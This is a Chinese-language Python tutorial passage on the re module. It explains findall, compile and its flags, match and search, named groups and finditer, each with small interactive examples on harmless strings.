<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">小结：以上基本上讲述了</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的语法规则。虽然大部分语法规则看上去都很简单，可是稍不注意，仍然会得到与期望大相径庭的结果，所以要写好正则式，需要仔细的体会正则式规则的含义后不同规则之间细微的差别。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">详细的了解了规则后，再配合后面就要介绍的功能函数，就能最大的发挥正则式的威力了。</span><span lang="EN-US" style=""></span></span></p> &lt;FONT style="FONT-SIZE: 10.5pt" face="""&gt; 
<br style="page-break-before:always"> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">2 re</span></span><span style="font-family:宋体">模块的基本函数</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">在上面的说明中，我们已经对</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块的基本函数</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘findall’</span></span><span style="font-family:宋体">很熟悉了。当然如果光有</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">的话，很多功能是不能实现的。下面开始介绍一下</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块其它的常用基本函数。灵活搭配使用这些函数，才能充分发挥</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的强大功能。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">首先还是说下老熟人</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">函数吧</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">findall(rule , target [,flag] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">在目标字符串中查找符合规则的字符串。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">第一个参数是规则，第二个参数是目标字符串，后面还可以跟一个规则选项（选项功能将在</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数的说明中详细说明）。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">返回结果结果是一个<strong style="">列表，</strong>中间存放的是符合规则的字符串。如果没有符合规则的字符串被找到，就返回一个<strong style="">空</strong>列表。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">2.1 </span></span><span style="font-family:宋体">使用</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">加速</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">compile( rule [,flag] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">将正则规则编译成一个</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象，以供接下来使用。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">第一个参数是规则式，第二个参数是规则选项。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">返回一个</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">直接使用</span><span lang="EN-US"><span style="font-family:Times New Roman">findall ( rule , target )</span></span><span style="font-family:宋体">的方式来匹配字符串，一次两次没什么，如果是多次使用的话，由于正则引擎每次都要把规则解释一遍，而规则的解释又是相当费时间的，所以这样的效率就很低了。如果要多次使用同一规则来进行匹配的话，可以使用</span><span lang="EN-US"><span style="font-family:Times New Roman">re.compile</span></span><span style="font-family:宋体">函数来将规则预编译，使用编译过返回的</span><span lang="EN-US"><span style="font-family:Times New Roman">Regular Expression Object</span></span><span style="font-family:宋体">或叫做</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象来进行查找。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s='111,222,aaa,bbb,ccc333,444ddd'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rule=r’\b\d+\b’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; compiled_rule=re.compile(rule)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; compiled_rule.findall(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['111', '222']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">可见使用</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">过的规则使用和未编译的使用很相似。</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数还可以指定一些规则标志，来指定一些特殊选项。多个选项之间用</span><span style="font-family:Times New Roman"> <span lang="EN-US">’<strong style="">|</strong>’</span></span><span style="font-family:宋体">（位或）连接起来。</span></span></p> 
<p class="MsoNormal" style="margin:0cm 0cm 0pt"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US" style="">I</span></strong><span lang="EN-US" style=""><span style="">      </span></span></span><strong><span style="font-family:宋体">IGNORECASE</span><span style="font-family:宋体; font-size:12pt"> </span></strong><span style="font-family:宋体">忽略大小写区别。<span lang="EN-US"></span></span></span></p> 
<p class="MsoNormal" style="margin:0cm 0cm 0pt"><span style="font-family:宋体"><span style="font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:0cm 0cm 0pt"><span style="font-size:16px"><strong><span style="font-family:宋体">L<span style="">   </span>LOCAL</span><span style="font-family:宋体; font-size:12pt"><span style="">  </span> </span></strong><span style="font-family:宋体">字符集本地化。这个功能是为了支持多语言版本的字符集使用环境的，比如在转义符\<span lang="EN-US">w</span>，在英文环境下，它代表<span lang="EN-US">[a-zA-Z0-9]</span>，即所以英文字符和数字。如果在一个法语环境下使用，缺省设置下，不能匹配</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">"é" </span></span><span style="font-family:宋体">或</span><span lang="EN-US" style=""><span style="font-family:Times New Roman"> "ç"</span></span><span style="font-family:宋体">。</span><span style="font-family:宋体">加上这</span><span lang="EN-US"><span style="font-family:Times New Roman">L</span></span><span style="font-family:宋体">选项和就可以匹配了。不过这个对于中文环境似乎没有什么用，它仍然不能匹配中文字符。</span></span></p> 
<p class="MsoNormal" style="margin:0cm 0cm 0pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:0cm 0cm 0pt"><span style="font-size:16px"><strong><span style="font-family:Times New Roman"><span lang="EN-US" style="">M</span><span lang="EN-US"><span style="">    </span>MULTILINE<span style="">  </span></span></span></strong><span style="font-family:宋体">多行匹配。在这个模式下</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">’^’(</span></span><span style="font-family:宋体">代表字符串开头</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">)</span></span><span style="font-family:宋体">和</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">’$’(</span></span><span style="font-family:宋体">代表字符串结尾</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">)</span></span><span style="font-family:宋体">将能够匹配多行的情况，成为行首和行尾标记。比如</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; s=’123 456\n789 012\n345 678’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; rc=re.compile(r’^\d+’)<span style="">    </span>#</span></span><span style="font-family:宋体">匹配一个位于开头的数字，没有使用</span><span lang="EN-US"><span style="font-family:Times New Roman">M</span></span><span style="font-family:宋体">选项</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rc.findall(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['123']<span style="">             </span>#</span></span><span style="font-family:宋体">结果只能找到位于第一个行首的</span><span lang="EN-US"><span style="font-family:Times New Roman">’123’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; rcm=re.compile(r’^\d+’,re.M)<span style="">       </span>#</span></span><span style="font-family:宋体">使用</span><span lang="EN-US"><span style="font-family:Times New Roman"> M </span></span><span style="font-family:宋体">选项</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rcm.findall(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['123', '789', '345']<span style="">  </span>#</span></span><span style="font-family:宋体">找到了三个行首的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">同样，对于</span><span lang="EN-US"><span style="font-family:Times New Roman">’$’</span></span><span style="font-family:宋体">来说，没有使用</span><span lang="EN-US"><span style="font-family:Times New Roman">M</span></span><span style="font-family:宋体">选项，它将匹配最后一个行尾的数字，即</span><span lang="EN-US"><span style="font-family:Times New Roman">’678’</span></span><span style="font-family:宋体">，加上以后，就能匹配三个行尾的数字</span><span lang="EN-US"><span style="font-family:Times New Roman">456 012</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">678</span></span><span style="font-family:宋体">了</span><span lang="EN-US"><span style="font-family:Times New Roman">.</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rc=re.compile(r’\d+$’)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rcm=re.compile(r’\d+$’,re.M)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rc.findall(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['678']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; rcm.findall(s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['456', '012', '678']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">S<span style="">     </span>DOTALL <span style="">      </span></span></strong><span lang="EN-US">‘.’</span></span><span style="font-family:宋体">号将匹配所有的字符。缺省情况下</span><span lang="EN-US"><span style="font-family:Times New Roman">’.’</span></span><span style="font-family:宋体">匹配除换行符</span><span lang="EN-US"><span style="font-family:Times New Roman">’\n’</span></span><span style="font-family:宋体">外的所有字符，使用这一选项以后，</span><span lang="EN-US"><span style="font-family:Times New Roman">’.’</span></span><span style="font-family:宋体">就能匹配包括</span><span lang="EN-US"><span style="font-family:Times New Roman">’\n’</span></span><span style="font-family:宋体">的任何字符了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" align="left" style="margin:0cm 0cm 0pt; text-align:left"><span style="font-size:16px"><strong><span style="font-family:宋体">U</span></strong><span style="font-family:宋体"><span style="">   </span><strong>UNICODE<span style="">       \</span></strong></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">w</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">W</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">b</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">B</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">d</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">D</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman">, \</span></span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">s</span></span></tt><span lang="EN-US"><span style="font-family:Times New Roman"> </span></span><span style="font-family:宋体">和</span><span style="font-family:Times New Roman"> \</span><tt><span lang="EN-US" style="font-size:12pt"><span style="font-family:宋体">S</span></span></tt></span><span style="font-family:宋体"><tt><span style="font-size:12pt">都将使用<span lang="EN-US">Unicode</span>。</span></tt><span style="font-family:宋体"></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">X<span style="">     </span>VERBOSE</span></strong><span lang="EN-US"><span style="">     </span></span></span><span style="font-family:宋体">这个选项忽略规则表达式中的空白，并允许使用</span><span lang="EN-US"><span style="font-family:Times New Roman">’#’</span></span><span style="font-family:宋体">来引导一个注释。这样可以让你把规则写得更美观些。比如你可以把规则</span></span></p> 
<pre><span style="font-family:宋体"><span lang="EN-US" style="font-size:10.5pt">&gt;&gt;&gt; rc</span><span lang="EN-US" style="font-size:10.5pt"> = re.compile(</span><span lang="EN-US" style="font-size:10.5pt">r</span><span lang="EN-US" style="font-size:10.5pt">"\</span><span lang="EN-US" style="font-size:10.5pt">d+|[a-zA-Z]+</span><span lang="EN-US" style="font-size:10.5pt">")</span><span lang="EN-US" style="font-size:10.5pt"><span style="">       </span>#</span><span style="font-size:10.5pt">匹配一个数字或者单词<span lang="EN-US"></span></span></span></pre> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:宋体">使用</span><span lang="EN-US"><span style="font-family:Times New Roman">X</span></span><span style="font-family:宋体">选项写成：</span></span></p> 
<pre><span style="font-family:宋体"><span lang="EN-US" style="font-size:10.5pt">&gt;&gt;&gt; rc</span><span lang="EN-US" style="font-size:10.5pt"> = re.compile(r"""</span><span lang="EN-US" style="font-size:10.5pt"><span style="">  </span># start a rule</span></span></pre> 
<pre style="text-indent:21pt"><span style="font-family:宋体"><span lang="EN-US" style="font-size:10.5pt">\d+</span><span lang="EN-US" style="font-size:10.5pt"><span style="">      </span></span><span lang="EN-US" style="font-size:10.5pt"><span style="">    </span><span style="">         </span></span><span lang="EN-US" style="font-size:10.5pt"># </span><span lang="EN-US" style="font-size:10.5pt">number</span></span></pre> 
<pre style="text-indent:21pt"><span style="font-family:宋体"><span lang="EN-US" style="font-size:10.5pt">| </span><span lang="EN-US" style="font-size:10.5pt">[a-zA-Z]+</span><span lang="EN-US" style="font-size:10.5pt"><span style="">   </span></span><span lang="EN-US" style="font-size:10.5pt"><span style="">        </span></span><span lang="EN-US" style="font-size:10.5pt"># </span><span lang="EN-US" style="font-size:10.5pt">word</span></span></pre> 
<pre style="text-indent:21pt"><span style="font-family:宋体"><span lang="EN-US" style="font-size:10.5pt">""", re.VERBOSE)</span><span lang="EN-US" style="font-size:10.5pt"></span></span></pre> 
<pre style="text-indent:17.95pt"><span style="font-size:10.5pt"><span style="font-family:宋体">在这个模式下，如果你想匹配一个空格，你必须用<span lang="EN-US">'\ '</span>的形式（<span lang="EN-US">'\'</span>后面跟一个空格） <span lang="EN-US"></span></span></span></pre> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">2.2 match</span></span><span style="font-family:宋体">与</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">match( rule , targetString [,flag] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">search( rule , targetString [,flag] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">（注：</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">的</span><span lang="EN-US"><span style="font-family:Times New Roman">match </span></span><span style="font-family:宋体">与</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">函数同</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">过的</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象的</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">与</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">函数的参数是不一样的。</span><span lang="EN-US"><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象的</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">与</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">函数更为强大，是真正最常用的函数）</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">按照规则在目标字符串中进行匹配。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">第一个参数是正则规则，第二个是目标字符串，第三个是选项（同</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数的选项）</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">返回：若成功返回一个</span><span lang="EN-US"><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象，失败无返回</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">虽然很直观，但是在进行更复杂的操作时，就有些力不从心了。此时更多的使用的是</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">函数。他们的参数和</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">是一样的，都是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">match( rule , targetString [,flag] )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">search( rule , targetString [,flag] )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">不过它们的返回不是一个简单的字符串列表，而是一个</span><span lang="EN-US"><span style="font-family:Times New Roman">MatchObject </span></span><span style="font-family:宋体">（如果匹配成功的话）</span><span lang="EN-US"><span style="font-family:Times New Roman">.</span></span><span style="font-family:宋体">。通过操作这个</span><span lang="EN-US"><span style="font-family:Times New Roman">matchObject</span></span><span style="font-family:宋体">，我们可以得到更多的信息。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">需要注意的是，如果匹配不成功，它们则返回一个</span><span lang="EN-US"><span style="font-family:Times New Roman">NoneType</span></span><span style="font-family:宋体">。所以在对匹配完的结果进行操作之前，你必需先判断一下是否匹配成功了，比如：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m=re.match( rule , target )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; if m:<span style="">                       </span>#</span></span><span style="font-family:宋体">必需先判断是否成功</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">        </span>doSomethin</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这两个函数唯一的区别是：</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">从字符串的开头开始匹配，如果开头位置没有匹配成功，就算失败了；而</span><span lang="EN-US"><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">会跳过开头，继续向后寻找是否有匹配的字符串。针对不同的需要，可以灵活使用这两个函数。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">关于</span><span lang="EN-US"><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">返回的</span><span lang="EN-US"><span style="font-family:Times New Roman">MatchObject</span></span><span style="font-family:宋体">如果使用的问题，是</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式的精髓所在，它与组的使用密切相关。我将在下一部分详细讲解，这里只举个最简单的例子：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s= 'Tom:9527 , Sharry:0003'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m=re.match( r'(?P&lt;name&gt;\w+):(?P&lt;num&gt;\d+)' , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.group()</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'Tom:9527'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.groups()</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">('Tom', '9527')</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.group(‘name’)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'Tom'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; m.group(‘num’)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">'9527'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">2.3 finditer</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">finditer( rule , target [,flag] )</span></span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">参数同</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">返回一个迭代器</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">finditer</span></span><span style="font-family:宋体">函数和</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">函数的区别是，</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">返回所有匹配的字符串，并存为一个列表，而</span><span lang="EN-US"><span style="font-family:Times New Roman">finditer</span></span><span style="font-family:宋体">则并不直接返回这些字符串，而是返回一个迭代器。关于迭代器，解释起来有点复杂，还是看看例子把：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; s=’111 222 333 444’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; for i in re.finditer(r’\d+’ , s ):</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman"><span style="">        </span>print i.group(),i.span()<span style="">          </span>#</span></span><span style="font-family:宋体">打印每次得到的字符串和起始结束位置</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">结果是</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">111 (0, 3)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">222 (4, 7)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">333 (8, 11)</span></span></p> 
